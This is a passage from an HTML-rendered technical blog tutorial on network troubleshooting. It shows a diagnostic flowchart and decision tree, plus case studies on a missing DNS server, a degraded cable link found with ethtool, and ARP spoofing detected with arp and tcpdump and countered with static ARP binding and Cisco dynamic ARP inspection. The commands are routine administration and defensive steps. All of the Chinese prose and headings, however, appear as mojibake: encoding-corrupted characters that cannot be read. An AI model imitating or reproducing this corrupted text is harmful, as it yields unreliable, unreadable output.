 â””â”€â”€ performance.py   <span class="hljs-comment"># æ€§èƒ½åˆ†æ</span><br>â”œâ”€â”€ monitor<span class="hljs-symbol">/</span><br>â”‚   â”œâ”€â”€ traffic.py       <span class="hljs-comment"># æµé‡ç›‘æ§</span><br>â”‚   â””â”€â”€ connection.py    <span class="hljs-comment"># è¿æ¥ç›‘æ§</span><br>â”œâ”€â”€ diagnosis<span class="hljs-symbol">/</span><br>â”‚   â””â”€â”€ auto_diagnose.py <span class="hljs-comment"># è‡ªåŠ¨è¯Šæ–­</span><br>â”œâ”€â”€ utils<span class="hljs-symbol">/</span><br>â”‚   â””â”€â”€ helpers.py       <span class="hljs-comment"># å·¥å…·å‡½æ•°</span><br>â””â”€â”€ main.py              <span class="hljs-comment"># ä¸»ç¨‹åº</span><br></code></pre></td></tr></table></figure><h3 id="2-2-æ ¸å¿ƒåŠŸèƒ½å®ç°"><a href="#2-2-æ ¸å¿ƒåŠŸèƒ½å®ç°" class="headerlink" title="2.2 æ ¸å¿ƒåŠŸèƒ½å®ç°"></a>2.2 æ ¸å¿ƒåŠŸèƒ½å®ç°</h3><p><strong>ç»¼åˆè¯Šæ–­æµç¨‹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è‡ªåŠ¨è¯Šæ–­æµç¨‹ï¼š<br><br><span class="hljs-bullet">1.</span> æ”¶é›†ä¿¡æ¯é˜¶æ®µ<br>   â”œâ”€ æœ¬æœºç½‘ç»œé…ç½®<br>   â”‚  â”œâ”€ IPåœ°å€<br>   â”‚  â”œâ”€ å­ç½‘æ©ç <br>   â”‚  â”œâ”€ é»˜è®¤ç½‘å…³<br>   â”‚  â””â”€ DNSæœåŠ¡å™¨<br>   â”œâ”€ ARPç¼“å­˜<br>   â””â”€ è·¯ç”±è¡¨<br><br><span class="hljs-bullet">2.</span> è¿é€šæ€§æµ‹è¯•<br>   â”œâ”€ Pingé»˜è®¤ç½‘å…³<br>   â”‚  â”œâ”€ æˆåŠŸï¼šç½‘å…³å¯è¾¾<br>   â”‚  â””â”€ å¤±è´¥ï¼šæœ¬åœ°ç½‘ç»œé—®é¢˜<br>   â”œâ”€ Ping DNSæœåŠ¡å™¨<br>   â”‚  â”œâ”€ æˆåŠŸï¼šDNSæœåŠ¡å™¨å¯è¾¾<br>   â”‚  â””â”€ å¤±è´¥ï¼šDNSé…ç½®æˆ–è·¯ç”±é—®é¢˜<br>   â””â”€ Pingå¤–ç½‘åœ°å€ï¼ˆ8.8.8.8ï¼‰<br><span class="hljs-code">      â”œâ”€ æˆåŠŸï¼šå¤–ç½‘è¿æ¥æ­£å¸¸</span><br><span class="hljs-code">      â””â”€ å¤±è´¥ï¼šè·¯ç”±æˆ–é˜²ç«å¢™é—®é¢˜</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">3.</span> DNSæµ‹è¯•<br>   â”œâ”€ è§£æå¸¸è§åŸŸå<br>   â”‚  â”œâ”€ æˆåŠŸï¼šDNSæ­£å¸¸<br>   â”‚  â””â”€ å¤±è´¥ï¼šDNSæœåŠ¡å™¨é—®é¢˜<br>   â””â”€ æµ‹è¯•è§£ææ—¶é—´<br><span class="hljs-code">      â”œâ”€ &lt;100msï¼šæ­£å¸¸</span><br><span class="hljs-code">      â””â”€ &gt;500msï¼šDNSæ…¢</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">4.</span> è·¯å¾„åˆ†æ<br>   â”œâ”€ Tracerouteåˆ°ç›®æ ‡<br>   â”œâ”€ åˆ†æè·³æ•°<br>   â”œâ”€ æ£€æµ‹å»¶è¿Ÿçªå¢<br>   â””â”€ è¯†åˆ«é—®é¢˜èŠ‚ç‚¹<br><br><span class="hljs-bullet">5.</span> æ€§èƒ½è¯„ä¼°<br>   â”œâ”€ ä¸¢åŒ…ç‡<br>   â”œâ”€ å¹³å‡å»¶è¿Ÿ<br>   â”œâ”€ å»¶è¿ŸæŠ–åŠ¨<br>   â””â”€ å¸¦å®½ä¼°ç®—<br><br><span class="hljs-bullet">6.</span> é—®é¢˜è¯Šæ–­<br>   â”œâ”€ åˆ†ææ”¶é›†çš„æ•°æ®<br>   â”œâ”€ è¯†åˆ«é—®é¢˜ç±»å‹<br>   â”œâ”€ å®šä½é—®é¢˜ä½ç½®<br>   â””â”€ ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š<br><br><span class="hljs-bullet">7.</span> å»ºè®®æ–¹æ¡ˆ<br>   â””â”€ æä¾›è§£å†³æ–¹æ¡ˆ<br></code></pre></td></tr></table></figure><p><strong>è¯Šæ–­å†³ç­–æ ‘</strong>ï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs autoit">ç½‘ç»œé—®é¢˜è¯Šæ–­å†³ç­–æ ‘ï¼š<br><br>æ— æ³•ä¸Šç½‘ï¼Ÿ<br>â”œâ”€ <span class="hljs-built_in">Ping</span>ç½‘å…³æˆåŠŸï¼Ÿ<br>â”‚  â”œâ”€ æ˜¯<br>â”‚  â”‚  â”œâ”€ <span class="hljs-built_in">Ping</span>å¤–ç½‘IPæˆåŠŸï¼Ÿ<br>â”‚  â”‚  â”‚  â”œâ”€ æ˜¯<br>â”‚  â”‚  â”‚  â”‚  â”œâ”€ DNSè§£ææˆåŠŸï¼Ÿ<br>â”‚  â”‚  â”‚  â”‚  â”‚  â”œâ”€ æ˜¯ â†’ åº”ç”¨å±‚é—®é¢˜<br>â”‚  â”‚  â”‚  â”‚  â”‚  â””â”€ å¦ â†’ DNSé…ç½®é—®é¢˜<br>â”‚  â”‚  â”‚  â”‚          è§£å†³ï¼šæ£€æŸ¥DNSè®¾ç½®<br>â”‚  â”‚  â”‚  â””â”€ å¦ â†’ è·¯ç”±é—®é¢˜<br>â”‚  â”‚  â”‚       è§£å†³ï¼šæ£€æŸ¥è·¯ç”±è¡¨ã€é˜²ç«å¢™<br>â”‚  â”‚  â””â”€ <span class="hljs-built_in">Ping</span>ç½‘å…³æˆåŠŸä½†é€Ÿåº¦æ…¢ï¼Ÿ<br>â”‚  â”‚       â”œâ”€ æ£€æŸ¥ç½‘å…³è´Ÿè½½<br>â”‚  â”‚       â”œâ”€ æ£€æŸ¥ARPè¡¨<br>â”‚  â”‚       â””â”€ å¯èƒ½ARPæ¬ºéª—<br>â”‚  â””â”€ å¦ â†’ æœ¬åœ°ç½‘ç»œé—®é¢˜<br>â”‚       â”œâ”€ æ£€æŸ¥ç½‘çº¿/WiFiè¿æ¥<br>â”‚       â”œâ”€ æ£€æŸ¥IPé…ç½®<br>â”‚       â”œâ”€ æ£€æŸ¥å­ç½‘æ©ç <br>â”‚       â””â”€ æ£€æŸ¥ARPç¼“å­˜<br><br>ç½‘é€Ÿæ…¢ï¼Ÿ<br>â”œâ”€ <span class="hljs-built_in">Ping</span>å»¶è¿Ÿé«˜ï¼Ÿ<br>â”‚  â”œâ”€ æ˜¯ â†’ ç½‘ç»œæ‹¥å¡æˆ–è·ç¦»è¿œ<br>â”‚  â”‚    â”œâ”€ Tracerouteæ‰¾ç“¶é¢ˆ<br>â”‚  â”‚    â””â”€ æ£€æŸ¥é“¾è·¯è´¨é‡<br>â”‚  â””â”€ å¦ â†’ åº”ç”¨å±‚æˆ–æœåŠ¡å™¨é—®é¢˜<br>â”œâ”€ ä¸¢åŒ…ç‡é«˜ï¼Ÿ<br>â”‚  â””â”€ æ˜¯ â†’ é“¾è·¯è´¨é‡é—®é¢˜<br>â”‚       â”œâ”€ æ£€æŸ¥ç½‘çº¿<br>â”‚       â”œâ”€ æ£€æŸ¥äº¤æ¢æœº<br>â”‚       â””â”€ æ£€æŸ¥WiFiä¿¡å·<br>â””â”€ é—´æ­‡æ€§æ…¢ï¼Ÿ<br>    â””â”€ å¯èƒ½æ˜¯ï¼š<br>        â”œâ”€ ç½‘ç»œæ‹¥å¡ï¼ˆé«˜å³°æœŸï¼‰<br>        â”œâ”€ DNSé—®é¢˜<br>        â””â”€ è´Ÿè½½å‡è¡¡åˆ‡æ¢<br></code></pre></td></tr></table></figure><hr><h2 id="3-ç½‘ç»œæ’é”™æ¡ˆä¾‹"><a href="#3-ç½‘ç»œæ’é”™æ¡ˆä¾‹" class="headerlink" title="3. ç½‘ç»œæ’é”™æ¡ˆä¾‹"></a>3. ç½‘ç»œæ’é”™æ¡ˆä¾‹</h2><h3 id="3-1-æ¡ˆä¾‹1ï¼šæ— æ³•è®¿é—®ç½‘ç«™"><a href="#3-1-æ¡ˆä¾‹1ï¼šæ— æ³•è®¿é—®ç½‘ç«™" class="headerlink" title="3.1 æ¡ˆä¾‹1ï¼šæ— æ³•è®¿é—®ç½‘ç«™"></a>3.1 æ¡ˆä¾‹1ï¼šæ— æ³•è®¿é—®ç½‘ç«™</h3><p><strong>é—®é¢˜æè¿°</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç”¨æˆ·æŠ¥å‘Šï¼šæ— æ³•è®¿é—®www.example.com<br><br>åˆæ­¥ä¿¡æ¯ï¼š<br><span class="hljs-bullet">- </span>æµè§ˆå™¨æ˜¾ç¤º&quot;æ— æ³•è®¿é—®æ­¤ç½‘ç«™&quot;<br><span class="hljs-bullet">- </span>å…¶ä»–ç½‘ç«™ä¹Ÿæ— æ³•è®¿é—®<br><span class="hljs-bullet">- </span>æ˜¨å¤©è¿˜æ­£å¸¸<br></code></pre></td></tr></table></figure><p><strong>æ’é”™æ­¥éª¤</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ­¥éª¤1: ç¡®è®¤é—®é¢˜èŒƒå›´<br>Q: æ˜¯æ‰€æœ‰è®¾å¤‡éƒ½æ— æ³•è®¿é—®ï¼Œè¿˜æ˜¯åªæœ‰è¿™å°ï¼Ÿ<br>A: åªæœ‰è¿™å°ç”µè„‘<br><br>ç»“è®ºï¼šä¸æ˜¯ç½‘ç»œæ•´ä½“é—®é¢˜ï¼Œæ˜¯æœ¬æœºé…ç½®é—®é¢˜<br><br>æ­¥éª¤2: æ£€æŸ¥æœ¬æœºè¿æ¥<br>å‘½ä»¤ï¼š<br><span class="hljs-comment"># Windows</span><br>ipconfig /all<br><br><span class="hljs-comment"># Linux</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>addr show<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip route </span>show<br><br>æ£€æŸ¥ï¼š<br>âœ… IPåœ°å€ï¼š192.168.1.100ï¼ˆæ­£å¸¸ï¼‰<br>âœ… å­ç½‘æ©ç ï¼š255.255.255.0ï¼ˆæ­£å¸¸ï¼‰<br>âœ… é»˜è®¤ç½‘å…³ï¼š192.168.1.1ï¼ˆæ­£å¸¸ï¼‰<br>âŒ DNSæœåŠ¡å™¨ï¼šæœªé…ç½®ï¼<br><br>æ­¥éª¤3: æµ‹è¯•ç½‘å…³è¿é€šæ€§<br>å‘½ä»¤ï¼š<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>192.168.1.1<br><br>ç»“æœï¼š<br>âœ… æˆåŠŸï¼Œç½‘å…³å¯è¾¾<br><br>æ­¥éª¤4: æµ‹è¯•å¤–ç½‘IP<br>å‘½ä»¤ï¼š<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>8.8.8.8<br><br>ç»“æœï¼š<br>âœ… æˆåŠŸï¼Œå¤–ç½‘è¿æ¥æ­£å¸¸<br><br>æ­¥éª¤5: æµ‹è¯•DNS<br>å‘½ä»¤ï¼š<br>nslookup www.example.com<br><br>ç»“æœï¼š<br>âŒ å¤±è´¥ï¼ŒDNSæŸ¥è¯¢è¶…æ—¶<br><br>è¯Šæ–­ç»“è®ºï¼š<br>DNSé…ç½®é—®é¢˜ï¼<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>é…ç½®DNSæœåŠ¡å™¨<br><br><span class="hljs-comment"># Windows</span><br>netsh<span class="hljs-built_in"> interface ip </span><span class="hljs-built_in">set</span><span class="hljs-built_in"> dns </span><span class="hljs-string">&quot;ä»¥å¤ªç½‘&quot;</span> static 8.8.8.8<br>netsh<span class="hljs-built_in"> interface ip </span><span class="hljs-built_in">add</span><span class="hljs-built_in"> dns </span><span class="hljs-string">&quot;ä»¥å¤ªç½‘&quot;</span> 8.8.4.4 <span class="hljs-attribute">index</span>=2<br><br><span class="hljs-comment"># Linux</span><br>sudo nano /etc/resolv.conf<br>nameserver 8.8.8.8<br>nameserver 8.8.4.4<br><br>éªŒè¯ï¼š<br>nslookup www.example.com<br>â†’ æˆåŠŸè§£æ<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>www.example.com<br>â†’ æˆåŠŸ<br><br>é—®é¢˜è§£å†³ï¼<br><br>æ ¹æœ¬åŸå› ï¼š<br>DHCPæœåŠ¡å™¨æœªåˆ†é…DNSï¼Œæˆ–æ‰‹åŠ¨é…ç½®IPæ—¶å¿˜è®°é…ç½®DNS<br></code></pre></td></tr></table></figure><h3 id="3-2-æ¡ˆä¾‹2ï¼šç½‘é€Ÿçªç„¶å˜æ…¢"><a href="#3-2-æ¡ˆä¾‹2ï¼šç½‘é€Ÿçªç„¶å˜æ…¢" class="headerlink" title="3.2 æ¡ˆä¾‹2ï¼šç½‘é€Ÿçªç„¶å˜æ…¢"></a>3.2 æ¡ˆä¾‹2ï¼šç½‘é€Ÿçªç„¶å˜æ…¢</h3><p><strong>é—®é¢˜æè¿°</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç”¨æˆ·æŠ¥å‘Šï¼šä¸‹è½½é€Ÿåº¦ä»100Mbpsé™åˆ°1Mbps<br><br>åˆæ­¥ä¿¡æ¯ï¼š<br><span class="hljs-bullet">- </span>è¿æ¥æ­£å¸¸ï¼Œä½†é€Ÿåº¦å¾ˆæ…¢<br><span class="hljs-bullet">- </span>Pingæ­£å¸¸ï¼Œå»¶è¿Ÿä¸é«˜<br><span class="hljs-bullet">- </span>å±€åŸŸç½‘å†…å…¶ä»–æœºå™¨æ­£å¸¸<br></code></pre></td></tr></table></figure><p><strong>æ’é”™æ­¥éª¤</strong>ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs ldif">æ­¥éª¤1: åŸºç¡€æµ‹è¯•<br>å‘½ä»¤ï¼š<br>ping -c 100 192.168.1.1<br><br>ç»“æœï¼š<br>100 packets transmitted, 100 received, 0% packet loss<br>rtt min/avg/max = 1.2/1.5/2.0 ms<br><br>âœ… Pingæ­£å¸¸ï¼Œæ— ä¸¢åŒ…ï¼Œå»¶è¿Ÿä½<br><br>æ­¥éª¤2: æ£€æŸ¥è¿æ¥é€Ÿåº¦<br>å‘½ä»¤ï¼š<br><span class="hljs-comment"># Linux</span><br>ethtool eth0<br><br>ç»“æœï¼š<br><span class="hljs-attribute">Speed</span>: 10Mb/s          â† é—®é¢˜ï¼åº”è¯¥æ˜¯1000Mb/s<br><span class="hljs-attribute">Duplex</span>: Half           â† é—®é¢˜ï¼åº”è¯¥æ˜¯Full<br><br>è¯Šæ–­ï¼š<br>ç½‘å¡åå•†åˆ°äº†10MbpsåŠåŒå·¥ï¼<br><br>æ­¥éª¤3: æ£€æŸ¥ç‰©ç†è¿æ¥<br>æ£€æŸ¥ï¼š<br><span class="hljs-literal">-</span> ç½‘çº¿ï¼š5ç±»çº¿ï¼ˆCat5ï¼‰â† å¤ªè€äº†<br><span class="hljs-literal">-</span> ç½‘çº¿é•¿åº¦ï¼š50ç±³<br><span class="hljs-literal">-</span> ç½‘çº¿çŠ¶æ€ï¼šç£¨æŸ<br><br>æ­¥éª¤4: è§£å†³æ–¹æ¡ˆ<br>æ–¹æ¡ˆ1ï¼ˆä¸´æ—¶ï¼‰ï¼š<br>å¼ºåˆ¶ç½‘å¡é€Ÿåº¦å’ŒåŒå·¥æ¨¡å¼<br><span class="hljs-comment"># Linux</span><br>sudo ethtool -s eth0 speed 100 duplex full autoneg off<br><br>æ–¹æ¡ˆ2ï¼ˆæ°¸ä¹…ï¼‰ï¼š<br>æ›´æ¢Cat6æˆ–Cat6aç½‘çº¿<br><br>æ‰§è¡Œæ–¹æ¡ˆ2ï¼š<br>æ›´æ¢æ–°ç½‘çº¿å<br><br>æµ‹è¯•ï¼š<br>ethtool eth0<br><span class="hljs-attribute">Speed</span>: 1000Mb/s<br><span class="hljs-attribute">Duplex</span>: Full<br><br>ä¸‹è½½æµ‹è¯•ï¼š<br>é€Ÿåº¦æ¢å¤åˆ°100Mbps<br><br>é—®é¢˜è§£å†³ï¼<br><br>æ ¹æœ¬åŸå› ï¼š<br>ç½‘çº¿è€åŒ–æˆ–è´¨é‡å·®ï¼Œå¯¼è‡´åå•†é€Ÿåº¦é™çº§<br><br>ç»éªŒæ•™è®­ï¼š<br><span class="hljs-literal">-</span> ç‰©ç†å±‚é—®é¢˜ä¹Ÿä¼šå¯¼è‡´é€Ÿåº¦æ…¢<br><span class="hljs-literal">-</span> æ£€æŸ¥é—®é¢˜è¦ä»åº•å±‚å¼€å§‹<br><span class="hljs-literal">-</span> ç½‘çº¿è´¨é‡å¾ˆé‡è¦<br></code></pre></td></tr></table></figure><h3 id="3-3-æ¡ˆä¾‹3ï¼šé—´æ­‡æ€§æ–­ç½‘"><a href="#3-3-æ¡ˆä¾‹3ï¼šé—´æ­‡æ€§æ–­ç½‘" class="headerlink" title="3.3 æ¡ˆä¾‹3ï¼šé—´æ­‡æ€§æ–­ç½‘"></a>3.3 æ¡ˆä¾‹3ï¼šé—´æ­‡æ€§æ–­ç½‘</h3><p><strong>é—®é¢˜æè¿°</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç”¨æˆ·æŠ¥å‘Šï¼šæ¯éš”å‡ åˆ†é’Ÿæ–­ç½‘ä¸€æ¬¡ï¼Œç„¶åè‡ªåŠ¨æ¢å¤<br><br>åˆæ­¥ä¿¡æ¯ï¼š<br><span class="hljs-bullet">- </span>æ–­ç½‘æŒç»­10-30ç§’<br><span class="hljs-bullet">- </span>ä¸å®šæœŸå‘ç”Ÿ<br><span class="hljs-bullet">- </span>å½±å“æ•´ä¸ªåŠå…¬å®¤<br></code></pre></td></tr></table></figure><p><strong>æ’é”™æ­¥éª¤</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ­¥éª¤1: ç›‘æ§è¿æ¥<br>å‘½ä»¤ï¼š<br><span class="hljs-comment"># æŒç»­pingç½‘å…³</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-i 0.2 192.168.1.1 | ts <span class="hljs-string">&#x27;[%Y-%m-%d %H:%M:%S]&#x27;</span><br><br>è§‚å¯Ÿï¼š<br>[2025-01-15 10:15:23] 64 bytes <span class="hljs-keyword">from</span> 192.168.1.1: <span class="hljs-attribute">time</span>=1.5 ms<br>[2025-01-15 10:15:23] 64 bytes <span class="hljs-keyword">from</span> 192.168.1.1: <span class="hljs-attribute">time</span>=1.3 ms<br>[2025-01-15 10:15:45] Request timeout<br>[2025-01-15 10:15:45] Request timeout<br>[2025-01-15 10:15:45] Request timeout<br>[2025-01-15 10:16:02] 64 bytes <span class="hljs-keyword">from</span> 192.168.1.1: <span class="hljs-attribute">time</span>=1.4 ms<br><br>æ¯éš”å‡ åˆ†é’Ÿè¶…æ—¶ä¸€æ¬¡<br><br>æ­¥éª¤2: æ£€æŸ¥ARPè¡¨<br>å‘½ä»¤ï¼š<br>watch -n 1 <span class="hljs-string">&#x27;arp -a&#x27;</span><br><br>è§‚å¯Ÿï¼š<br>ç½‘å…³MACåœ°å€åœ¨å˜åŒ–ï¼<br><br>æ­£å¸¸ï¼š<br>192.168.1.1  aa:bb:cc:dd:ee:ff  (è·¯ç”±å™¨)<br><br>å¼‚å¸¸æ—¶ï¼š<br>192.168.1.1  11:22:33:44:55:66  (æœªçŸ¥è®¾å¤‡)<br><br>è¯Šæ–­ï¼š<br>ARPæ¬ºéª—æ”»å‡»ï¼<br><br>æ­¥éª¤3: ç›‘æ§ARP<br>å‘½ä»¤ï¼š<br>sudo tcpdump -i eth0 arp -vv<br><br>å‘ç°ï¼š<br>å¤§é‡ARPåº”ç­”æ¥è‡ª 11:22:33:44:55:66<br>å£°ç§°è‡ªå·±æ˜¯192.168.1.1<br><br>æ­¥éª¤4: å®šä½æ”»å‡»æº<br>æ ¹æ®MACåœ°å€æŸ¥æ‰¾ï¼š<br>- æ£€æŸ¥äº¤æ¢æœºMACåœ°å€è¡¨<br>- æ‰¾åˆ°å¯¹åº”ç«¯å£<br>- å®šä½åˆ°æŸå°ç”µè„‘<br><br>æ£€æŸ¥è¯¥ç”µè„‘ï¼š<br>å‘ç°å®‰è£…äº†æŸ<span class="hljs-string">&quot;ç½‘ç»œåŠ é€Ÿè½¯ä»¶&quot;</span><br>è¯¥è½¯ä»¶ä¼šè¿›è¡ŒARPæ¬ºéª—ä»¥<span class="hljs-string">&quot;åŠ é€Ÿ&quot;</span><br><br>æ­¥éª¤5: è§£å†³æ–¹æ¡ˆ<br>ç«‹å³è§£å†³ï¼š<br>1. å…³é—­è¯¥è½¯ä»¶<br>2. é™æ€ç»‘å®šç½‘å…³ARP<br>   arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br>é•¿æœŸæ–¹æ¡ˆï¼š<br>1. äº¤æ¢æœºå¯ç”¨DAIï¼ˆåŠ¨æ€ARPæ£€æµ‹ï¼‰<br>2. ç«¯å£å®‰å…¨<br>3. ç½‘ç»œç›‘æ§<br><br>é…ç½®äº¤æ¢æœºï¼ˆCiscoï¼‰ï¼š<br>Switch(config)#<span class="hljs-built_in"> ip </span>arp inspection<span class="hljs-built_in"> vlan </span>1-100<br>Switch(config)#<span class="hljs-built_in"> ip </span>dhcp snooping<br>Switch(config)#<span class="hljs-built_in"> ip </span>dhcp snooping<span class="hljs-built_in"> vlan </span>1-100<br><br>é—®é¢˜è§£å†³ï¼<br><br>æ ¹æœ¬åŸå› ï¼š<br>ç”¨æˆ·å®‰è£…äº†æ¶æ„è½¯ä»¶å¯¼è‡´ARPæ¬ºéª—<br><br>ç»éªŒæ•™è®­ï¼š<br>- ARPæ¬ºéª—æ˜¯å¸¸è§æ”»å‡»<br>- ç›‘æ§ARPå˜åŒ–å¾ˆé‡è¦<br>- äº¤æ¢æœºå®‰å…¨é…ç½®å¿…ä¸å¯å°‘<br>- ç”¨æˆ·å®‰å…¨æ„è¯†éœ€è¦æé«˜<br></code></pre></td></tr></table></figure><hr><h2 id="4-æ€§èƒ½ä¼˜åŒ–"><a href="#4-æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="4. æ€§èƒ½ä¼˜åŒ–"></a>4. æ€§èƒ½ä¼˜åŒ–</h2><h3 